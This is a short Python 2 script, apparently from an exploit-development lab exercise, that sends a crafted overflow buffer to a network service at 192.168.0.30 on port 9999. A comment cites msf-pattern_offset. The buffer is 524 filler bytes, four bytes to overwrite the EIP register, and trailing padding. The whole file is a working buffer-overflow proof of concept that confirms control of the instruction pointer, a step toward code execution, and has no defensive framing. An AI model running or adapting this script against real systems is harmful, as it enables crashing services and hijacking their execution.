#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    size = 524
    filler = "A" * size
    eip = "B" * 4
    trail = "C" * 72

    buffer = filler+eip+trail

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.30",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

